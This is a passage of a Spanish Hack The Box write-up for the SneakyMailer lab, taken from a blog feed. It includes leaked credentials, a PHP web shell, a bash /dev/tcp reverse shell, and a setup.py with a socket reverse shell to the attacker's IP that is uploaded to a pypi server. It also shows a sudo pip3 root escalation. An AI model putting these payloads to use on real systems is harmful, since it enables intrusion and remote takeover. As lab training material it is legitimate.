From: Paul Byrd &amp;lt;paulbyrd@sneakymailer.htb&amp;gt;
Subject: Password reset
Date: Fri, 15 May 2020 13:03:37 -0500
Importance: normal
X-Priority: 3
Content-Type: multipart/alternative;
	boundary=&quot;_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_&quot;

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset=&quot;utf-8&quot;

Hello administrator, I want to change this password for the developer accou=
nt

Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C

Please notify me when you do it=20

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
Content-Transfer-Encoding: quoted-printable
Content-Type: text/html; charset=&quot;utf-8&quot;

&amp;lt;html xmlns:o=3D&quot;urn:schemas-microsoft-com:office:office&quot; xmlns:w=3D&quot;urn:sc=
hemas-microsoft-com:office:word&quot; xmlns:m=3D&quot;http://schemas.microsoft.com/of=
fice/2004/12/omml&quot; xmlns=3D&quot;http://www.w3.org/TR/REC-html40&quot;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta ht=
tp-equiv=3DContent-Type content=3D&quot;text/html; charset=3Dutf-8&quot;&amp;gt;&amp;lt;meta name=
=3DGenerator content=3D&quot;Microsoft Word 15 (filtered medium)&quot;&amp;gt;&amp;lt;style&amp;gt;&amp;lt;!--
/* Font Definitions */
@font-face
	{font-family:&quot;Cambria Math&quot;;
	panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
	{font-family:Calibri;
	panose-1:2 15 5 2 2 2 4 3 2 4;}
/* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
	{margin:0in;
	margin-bottom:.0001pt;
	font-size:11.0pt;
	font-family:&quot;Calibri&quot;,sans-serif;}
.MsoChpDefault
	{mso-style-type:export-only;}
@page WordSection1
	{size:8.5in 11.0in;
	margin:1.0in 1.0in 1.0in 1.0in;}
div.WordSection1
	{page:WordSection1;}
--&amp;gt;&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body lang=3DEN-US link=3Dblue vlink=3D&quot;#954F72&quot;&amp;gt;&amp;lt;div cla=
ss=3DWordSection1&amp;gt;&amp;lt;p class=3DMsoNormal&amp;gt;Hello administrator, I want to chang=
e this password for the developer account&amp;lt;/p&amp;gt;&amp;lt;p class=3DMsoNormal&amp;gt;&amp;lt;o:p&amp;gt;&amp;amp;nbs=
p;&amp;lt;/o:p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p class=3DMsoNormal&amp;gt;Username: developer&amp;lt;/p&amp;gt;&amp;lt;p class=3DMsoNorma=
l&amp;gt;Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C&amp;lt;/p&amp;gt;&amp;lt;p class=3DMsoNorm=
al&amp;gt;&amp;lt;o:p&amp;gt;&amp;amp;nbsp;&amp;lt;/o:p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p class=3DMsoNormal&amp;gt;Please notify me when you do i=
t &amp;lt;/p&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;=

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_--
)
a7 OK FETCH completed.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como ahora disponemos de credenciales nuevas:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Volemos a tratar de conectarnos por &lt;code&gt;ftp&lt;/code&gt; y esta vez la conexión es exitosa.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ftp 10.10.10.197
Connected to 10.10.10.197.
220 (vsFTPd 3.0.3)
Name (10.10.10.197:fmiracle): developer
331 Please specify the password.
Password:
230 Login successful.

Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; 
ftp&amp;gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    8 0        1001         4096 Jun 30  2020 dev
226 Directory send OK.
ftp&amp;gt; cd dev
250 Directory successfully changed.
ftp&amp;gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26  2020 css
drwxr-xr-x    2 0        0            4096 May 26  2020 img
-rwxr-xr-x    1 0        0           13742 Jun 23  2020 index.php
drwxr-xr-x    3 0        0            4096 May 26  2020 js
drwxr-xr-x    2 0        0            4096 May 26  2020 pypi
drwxr-xr-x    4 0        0            4096 May 26  2020 scss
-rwxr-xr-x    1 0        0           26523 May 26  2020 team.php
drwxr-xr-x    8 0        0            4096 May 26  2020 vendor
226 Directory send OK.
ftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de conectarnos visualizamos un directorio &lt;code&gt;dev&lt;/code&gt; y dentro un contenido de nombre &lt;code&gt;team.php&lt;/code&gt;, que curiosamente era la ruta de la pagina donde estaban expuestos los correos.&lt;/p&gt;

&lt;p&gt;Para poder saber si tenemos permiso de escritura intentaremos subir un archivo de nombre &lt;code&gt;cmd.php&lt;/code&gt; que con el uso de la función &lt;code&gt;shell_exec&lt;/code&gt; me ejecute un comando a nivel de sistema que vamos a controlar con el parametro &lt;code&gt;cmd&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
    echo &quot;&amp;lt;pre&amp;gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&amp;lt;/pre&amp;gt;&quot;;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Comprobamos que efectivamente si podemos subir el archivo&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ftp&amp;gt; put cmd.php
local: cmd.php remote: cmd.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
d226 Transfer complete.
69 bytes sent in 0.00 secs (811.8411 kB/s)
ftp&amp;gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
--wxrw-rw-    1 1001     1001           69 Apr 08 19:15 cmd.php
drwxr-xr-x    2 0        0            4096 May 26  2020 css
drwxr-xr-x    2 0        0            4096 May 26  2020 img
-rwxr-xr-x    1 0        0           13742 Jun 23  2020 index.php
drwxr-xr-x    3 0        0            4096 May 26  2020 js
drwxr-xr-x    2 0        0            4096 May 26  2020 pypi
drwxr-xr-x    4 0        0            4096 May 26  2020 scss
-rwxr-xr-x    1 0        0           26523 May 26  2020 team.php
drwxr-xr-x    8 0        0            4096 May 26  2020 vendor
226 Directory send OK.
ftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visitamos la &lt;code&gt;url&lt;/code&gt;, pero esta vez apuntaremos al fichero que subimos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sneakymailer/sneaky3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;El servicio nos reporta un codigo de estado &lt;code&gt;400&lt;/code&gt; lo que corresponde a que el archivo no existe…&lt;/p&gt;

&lt;p&gt;Pero dado a que existe un directorio &lt;code&gt;dev&lt;/code&gt; podemos pensar que puede ser un posible subdominio, asi que usaremos &lt;code&gt;gobuster&lt;/code&gt; para tratar de enumerar posibles subdominios validos existentes y usaremos el diccionario &lt;code&gt;subdomains-top1million-5000.txt&lt;/code&gt; del repositorio de &lt;code&gt;seclists&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/OJ/gobuster&quot;&gt;https://github.com/OJ/gobuster&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://sneakycorp.htb/ -t 200
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://sneakycorp.htb/
[+] Method:       GET
[+] Threads:      200
[+] Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/04/08 23:21:48 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.sneakycorp.htb (Status: 200) [Size: 13742]
                                                     
===============================================================
2023/04/08 23:21:58 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pues &lt;code&gt;gobuster&lt;/code&gt; nos reporta que el subdominio es valido, lo que quiere decir que el archivo que subimos antes existe, pero bajo ese subdominio.&lt;/p&gt;

&lt;p&gt;Procedemos a subir nuevamente el archivo ya que a intervalos de tiempo nos lo borra&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ftp&amp;gt; put cmd.php
local: cmd.php remote: cmd.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
69 bytes sent in 0.00 secs (990.9237 kB/s)
ftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Volvemos a visitar la &lt;code&gt;url&lt;/code&gt; esta vez apuntando al subdominio y al archivo subido no sin antes agregar el subdominio a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.197 dev.sneakycorp.htb&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esta vez si podemos apuntar al archivo &lt;code&gt;cmd.php&lt;/code&gt; y con el parametro &lt;code&gt;cmd&lt;/code&gt; tal y como lo habiamos especificado, podemos ejecutar comandos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sneakymailer/sneaky4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo siguiente sera ganar acceso a la maquina, mandandonos una shell reversa a nuestra maquina local, ello lo haremos con &lt;code&gt;bash&lt;/code&gt; con el comando &lt;code&gt;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.2/443 0&amp;gt;&amp;amp;1'&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;No olvidemos poner los &lt;code&gt;&amp;amp;&lt;/code&gt; en urleconde &lt;code&gt;%26&lt;/code&gt; para evitar problemas, y enviamos la petición&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sneakymailer/sneaky5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos ponemos en escucha y recimos la conexión como el usuario &lt;code&gt;www-data&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:37818.
bash: cannot set terminal process group (734): Inappropriate ioctl for device
bash: no job control in this shell
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ whoami
whoami
www-data
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como siempre al ser una maquina &lt;code&gt;linux&lt;/code&gt; hacemos un tratamiento de la &lt;code&gt;tty&lt;/code&gt; para que sea full interactiva y ajustamos el tamaño de las proporciones de la pantall.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ export TERM=xterm
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ export SHELL=bash
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ stty rows 48 columns 184
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez en la maquina listamos los procesos corriendo y vemos uno correspondiente a &lt;code&gt;pypi&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ ps -faux | grep 5000
www-data  7185  0.0  0.0   3084   824 pts/0    S+   19:49   0:00  |                           \_ grep 5000
pypi       741  0.0  0.6  36804 25824 ?        Ss   17:09   0:08 /var/www/pypi.sneakycorp.htb/venv/bin/python3 /var/www/pypi.sneakycorp.htb/venv/bin/pypi-server -i 127.0.0.1 -p 5000 -a update,download,list -P /var/www/pypi.sneakycorp.htb/.htpasswd --disable-fallback -o /var/www/pypi.sneakycorp.htb/packages
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos ver que se establece un tipo de conexión procediente de un archivo asi que procederemos a leeerlo&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ cat /var/www/pypi.sneakycorp.htb/.htpasswd
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos una contraseña encryptada que procederemos a crackearla por fuerza bruta con &lt;code&gt;john&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;
Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
soufianeelhaoui  (?)
1g 0:00:00:08 DONE (2023-04-08 23:53) 0.1172g/s 419023p/s 419023c/s 419023C/s soulfire1..souderton16
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos nuevas credenciales &lt;code&gt;pypi:soufianeelhaoui&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Como vimos que por detras esta configurado un &lt;code&gt;nginx&lt;/code&gt; vamos a listar los sitios disponibles del directorio &lt;code&gt;sites-available&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Encotramos el subdominio &lt;code&gt;pypi.sneakycorp.htb&lt;/code&gt; que esta en escucha por el puerto &lt;code&gt;8080&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ cat /etc/nginx/sites-available/pypi.sneakycorp.htb 
server {
	listen 0.0.0.0:8080 default_server;
	listen [::]:8080 default_server;
	server_name _;
}


server {
	listen 0.0.0.0:8080;
	listen [::]:8080;

	server_name pypi.sneakycorp.htb;

	location / {
		proxy_pass http://127.0.0.1:5000;
		proxy_set_header Host $host;
		proxy_set_header X-Real-IP $remote_addr;
	}
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Agregamos el subdominio al &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.197 pypi.sneakycorp.htb&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo abrimos en el navegador&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sneakymailer/sneaky6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como vemos un &lt;code&gt;pypi server&lt;/code&gt; lo que podriamos hacer es tratar de crearnos nuestro propio paquete malicioso de &lt;code&gt;pypi&lt;/code&gt; y tratar de subirlo a la maquina victima e intentar colar un comando en la maquina victima.&lt;/p&gt;

&lt;p&gt;Ahora la pregunta es como creamos un paquete en python?&lt;/p&gt;

&lt;p&gt;Solo debes seguir la guia de este recurso donde se explica a detalle como hacerlo&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/&quot;&gt;https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;La estructura al crear un paquete debe ser similar a esta:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;linode_example/
    linode_example/
        __init__.py
    setup.py
    setup.cfg
    README.md
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entonces procederemos a crear una estructura similar en nuestra maquina en este caso pondre de nombre a los directorios como &lt;code&gt;package&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 package   setup.cfg   setup.py
❯ tree
.
├── package
│   ├── __init__.py
│   └── package
├── setup.cfg
└── setup.py

2 directories, 3 files
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo siguiente sera editar el &lt;code&gt;setup.py&lt;/code&gt;, donde ademas añadiremos un codigo para ejecutarnos una &lt;code&gt;reverse shell&lt;/code&gt; que se ejecutara cuando se inicie el &lt;code&gt;setup.py&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from setuptools import setup

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((&quot;10.10.16.2&quot;,443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])

setup(
    name='linode_example',
    #packages=['linode_example'],
    description='Hello world enterprise edition',
    version='0.1',
    url='http://github.com/example/linode_example',
    author='Linode',
    author_email='docs@linode.com',
    keywords=['pip','linode','example']
    )
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Comentar o borrar la linea de &lt;code&gt;packages=['linode_example']&lt;/code&gt; ya que suele dar problema.&lt;/p&gt;

&lt;p&gt;Ahora lo que tenemos que hacer es que el servidor de la maquina victima al momento de instalar el paquete me ejecute la &lt;code&gt;reverse shell&lt;/code&gt; y eso lo hariamos creando un archivo &lt;code&gt;.pypirc&lt;/code&gt; donde definamos cual es el repositorio al cual te quieras conectar y las credenciales de autenticación que de antes la tenemos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat ~/.pypirc
[distutils]
index-servers = sneakypwned
[sneakypwned]
repository: http://pypi.sneakycorp.htb:8080/
username: pypi
password: soufianeelhaoui
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Por ultimo sera ejecutar el siguiente comando para tratar de cargar el paquete en la maquina victima &lt;code&gt;python3 setup.py sdist upload -r linode&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Donde reeemplazaremos &lt;code&gt;linode&lt;/code&gt; por el nombre que pusimos el el &lt;code&gt;index-servers&lt;/code&gt; en el &lt;code&gt;.pypirc&lt;/code&gt; que en nuestro caso es sneakypwned&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python3&quot;&gt;python3 setup.py sdist upload -r sneakypwned
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos el &lt;code&gt;setup.py&lt;/code&gt; y nos ponemos en escucha con &lt;code&gt;ncat&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.16.2.
Ncat: Connection from 10.10.16.2:46076.
# whoami
root
# pwd
/home/fmiracle/Machines/Sneakymailer/content/create
#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero vemos que nos hace una conexión a nuestra propia maquina, esto es por que primero se ejecuta la conexión locamente&lt;/p&gt;

&lt;p&gt;Lo que debemos hacer es volver a ponernos en escucha con &lt;code&gt;ncat&lt;/code&gt; y salir de nuestra conexión local con un &lt;code&gt;exit&lt;/code&gt; esto hara que se ejecute la conexión esta vez de la maquina victima.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.16.2.
Ncat: Connection from 10.10.16.2:37168.
# whoami
root
# pwd
/home/fmiracle/Machines/Sneakymailer/content/create
# exit
running sdist
running egg_info
writing linode_example.egg-info/PKG-INFO
writing dependency_links to linode_example.egg-info/dependency_links.txt
writing top-level names to linode_example.egg-info/top_level.txt
reading manifest file 'linode_example.egg-info/SOURCES.txt'
writing manifest file 'linode_example.egg-info/SOURCES.txt'
warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md

running check
creating linode_example-0.1
creating linode_example-0.1/linode_example.egg-info
creating linode_example-0.1/package
copying files to linode_example-0.1...
copying setup.cfg -&amp;gt; linode_example-0.1
copying setup.py -&amp;gt; linode_example-0.1
copying linode_example.egg-info/PKG-INFO -&amp;gt; linode_example-0.1/linode_example.egg-info
copying linode_example.egg-info/SOURCES.txt -&amp;gt; linode_example-0.1/linode_example.egg-info
copying linode_example.egg-info/dependency_links.txt -&amp;gt; linode_example-0.1/linode_example.egg-info
copying linode_example.egg-info/top_level.txt -&amp;gt; linode_example-0.1/linode_example.egg-info
copying package/__init__.py -&amp;gt; linode_example-0.1/package
Writing linode_example-0.1/setup.cfg
Creating tar archive
removing 'linode_example-0.1' (and everything under it)
running upload
Submitting dist/linode_example-0.1.tar.gz to http://pypi.sneakycorp.htb:8080/
Server response (200): OK
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recibimos la conexión desde la maquina victima como el usuario &lt;code&gt;low&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:45570.
$ whoami
low
$ hostname -I
10.10.10.197 dead:beef::250:56ff:feb9:6b16 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Realizamos nuevamente un tratamiento de la &lt;code&gt;tty&lt;/code&gt; como ya hicimos anteriormente, nos dirigimos al directorio personal del usuario y podemos visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;low@sneakymailer:/$ cd /home
low@sneakymailer:/home$ ls
low  vmail
low@sneakymailer:/home$ cd low/
low@sneakymailer:~$ cat user.txt 
4a39c61b14f3e1c7c83014390f90942e
low@sneakymailer:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ejecutamos el comando &lt;code&gt;sudo -l&lt;/code&gt; para ver si tenemos privilegios a nivel de &lt;code&gt;sudoers&lt;/code&gt; y vemos que tenemos uno asociado al comando &lt;code&gt;pip3&lt;/code&gt; el cual podemos ejecutar como &lt;code&gt;root&lt;/code&gt; de forma temporal sin requerir contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;low@sneakymailer:~$ sudo -l
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Matching Defaults entries for low on sneakymailer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo siguiente sera dirigirnos a nuestra web de confianza&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;https://gtfobins.github.io/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ahi podemos ver que si tenemos el privilegio de sudo en &lt;code&gt;pip3&lt;/code&gt;, debemos ejecutar los siguentes comandos y nos convertiremos en el usuario &lt;code&gt;root&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;low@sneakymailer:~$ TF=$(mktemp -d)
low@sneakymailer:~$ echo &quot;import os; os.execl('/bin/sh', 'sh', '-c', 'sh &amp;lt;$(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)')&quot; &amp;gt; $TF/setup.py
low@sneakymailer:~$ sudo pip install $TF
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
[sudo] password for low: 
low@sneakymailer:~$ TF=$(mktemp -d)
low@sneakymailer:~$ echo &quot;import os; os.execl('/bin/sh', 'sh', '-c', 'sh &amp;lt;$(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)')&quot; &amp;gt; $TF/setup.py
low@sneakymailer:~$ sudo pip3 install $TF
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Processing /tmp/tmp.25RDYk7IwK
# whoami
root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finalmente podemos dirigirnos al directorio de &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt; :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# cd /root
# cat root.txt
25ae2132a2ff299928b234e186ad53ec
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Sat, 08 Apr 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Sneakymailer</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Sneakymailer</guid>
        
        <category>Information Leaked</category>
        
        <category>Emailing Attack</category>
        
        <category>Abussing Pypi Server</category>
        
        <category>Sudoers Privilege pip3</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Aprende Python desde cero a avanzado curso completo</title>
        <description>&lt;p&gt;En esta ocasion hablaremos del lenguaje de programacion &lt;code&gt;Python3&lt;/code&gt;, realizaremos todo un curso completo desde lo mas basico y explicaremos todo lo escencial para que se pueda llegar a dominar este lenguaje.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;El articulo se ira actualizando constantemente - Ultima actualización &lt;code&gt;27 - 04 - 2023&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;que-es-python3&quot;&gt;Que es Python3?&lt;/h1&gt;

&lt;p&gt;Python3 es un lenguaje de programación ampliamente utilizado en las aplicaciones web, el desarrollo de software, la ciencia de datos y el machine learning. Es preferido entre los desarrolladores porque es eficiente y fácil de aprender, además de que se puede ejecutar en muchas plataformas diferentes, se integra bien a todos los tipos de sistemas y aumenta la velocidad del desarrollo. El software podemos descargarlo gratis de su pagina oficial.&lt;/p&gt;

&lt;h2 id=&quot;indice-y-estructura&quot;&gt;Indice y Estructura&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#que-es-Python3?&quot;&gt;Que es Python3&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sintaxis&quot;&gt;Sintaxis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#variables&quot;&gt;Variables&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#tipos-de-variables&quot;&gt;Tipos de Variables&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#asignación-multiple-de-variables&quot;&gt;Asignación Multiple de Variables&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#sintaxis-de-variables&quot;&gt;Sintaxis de Variables&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#strings&quot;&gt;Strings&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#indexación&quot;&gt;Indexación&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#slicing&quot;&gt;Slicing&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#stride&quot;&gt;Stride&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#modificación-de-strings&quot;&gt;Modificación de Strings&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#strings-de-multiples-lineas&quot;&gt;Strings de multiples lineas&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
